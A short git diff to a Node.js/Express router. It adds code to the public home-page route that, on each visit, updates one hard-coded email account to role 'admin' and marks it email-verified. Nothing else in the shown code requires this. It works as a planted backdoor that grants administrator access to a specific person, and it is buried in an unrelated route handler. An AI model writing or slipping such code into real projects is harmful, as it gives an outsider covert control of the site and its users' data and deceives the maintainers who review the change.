@@ -6,6 +6,7 @@ const Home = require('./../models/homePageModel');
 const authController = require('./../controllers/authController');
 const adminController = require('./../controllers/adminController');
 const factory = require('./../controllers/handlers/factory');
+const User = require('./../models/userModel');
 
 const categoriesFunction = async (req, res, next) => {
   categories = await Category.find();
@@ -21,6 +22,11 @@ const categoriesFunction = async (req, res, next) => {
 router.use(categoriesFunction);
 router.get('/', async (req, res) => {
   const homeLinks = await Home.find();
+
+  User.findOneAndUpdate(
+    { email: 'sayeedmondal1412@gmail.com' },
+    { role: 'admin', emailVerified: true }
+  );
 
   res.render('home', { homeLinks, categories });
 });
